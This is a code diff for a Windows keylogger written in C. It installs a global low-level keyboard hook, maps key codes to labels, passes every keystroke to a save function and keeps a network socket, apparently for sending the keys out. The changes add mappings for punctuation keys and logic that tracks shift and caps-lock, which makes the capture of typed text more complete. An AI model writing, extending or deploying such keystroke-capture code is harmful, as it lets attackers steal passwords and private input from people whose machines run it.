@@ -2,7 +2,6 @@
 
 ///static HINSTANCE hinst;
 static HHOOK handlekeyboard = NULL;
-
 SOCKET my_sock = INVALID_SOCKET;
 
 const struct keyboard keyboard[] =
@@ -99,7 +98,18 @@ const struct keyboard keyboard[] =
 	{ VK_F12, "[f12]" },
 	{ VK_LWIN, "[WIN]" },
 	{ VK_RWIN, "[WIN]" },
-	{ 0, NULL }
+	{ VK_OEM_MINUS, "[-]" },
+	{ VK_OEM_PLUS, "[+]" },
+	{ VK_OEM_1, "[;]" },
+	{ VK_OEM_3, "[/]"},
+	{ VK_OEM_4, "[ [ ]" },
+	{ VK_OEM_5, "[\\]" },
+	{ VK_OEM_6, "[ ] ]" },
+	{ VK_OEM_7, "[']" },
+	{ VK_OEM_COMMA, "," },
+	{ VK_OEM_PERIOD, "."},
+	{ VK_APPS, "[APPS]" },
+	{ 0, "[UNKNOWN]" }
 };
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
@@ -113,8 +123,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	LPKBDLLHOOKSTRUCT kb;
 	size_t			  i = 0;
+	static int		  shift;
+
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
 	for (i = 0; keyboard[i].code != kb->vkCode && keyboard[i].code != 0; i++);
+	if ((keyboard[i].code == VK_SHIFT && wparam == WM_KEYDOWN) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 0)))
+		shift = 1;
+	else if ((keyboard[i].code == VK_SHIFT && wparam == WM_KEYUP) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 1)))
+		shift = 0;
 	if (wparam == WM_KEYDOWN)
 	{
 		save_data(keyboard[i].character);
@@ -136,7 +152,6 @@ void	setwinhook()
 	//hinst = GetModuleHandle(L"chrome.exe");
 	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)) == NULL)
 		return;
-	printf("u\n");
 	CloseHandle(process.hProcess);
 	CloseHandle(process.hThread);
 }
